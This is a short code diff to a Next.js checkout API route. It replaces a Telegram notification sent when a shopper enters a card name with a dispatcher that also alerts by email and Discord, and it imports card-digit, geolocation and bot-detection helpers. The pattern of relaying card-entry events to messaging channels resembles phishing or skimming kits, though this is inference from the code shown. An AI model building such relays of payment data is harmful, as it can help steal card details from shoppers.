@@ -4,7 +4,7 @@ import { cardDigits, isValidCardName } from "@/lib/checkout/card-validation";
 import { formatCheckoutCardNameTelegramMessage } from "@/lib/checkout/format-telegram";
 import { getSiteSettings } from "@/lib/data/site-settings";
 import { resolveBranding } from "@/lib/site/branding";
-import { sendTelegramMessage } from "@/lib/telegram/notify";
+import { sendAlert } from "@/lib/notifications/dispatch";
 import { resolveVisitorGeo } from "@/lib/visitors/geo-details";
 import { isLikelyBot } from "@/lib/visitors/user-agent";
 
@@ -61,10 +61,18 @@ export async function POST(request: NextRequest) {
     storeName: storeName || undefined,
   });
 
-  const sent = await sendTelegramMessage(message);
+  const delivery = await sendAlert(
+    "Checkout — card name entered",
+    message
+  );
 
   return apiSuccess({
-    sent,
-    reason: sent ? "sent" : "telegram_not_configured",
+    sent: delivery.sent,
+    reason: delivery.sent ? delivery.reason : "telegram_not_configured",
+    channels: {
+      telegram: delivery.telegram,
+      email: delivery.email,
+      discord: delivery.discord,
+    },
   });
 }
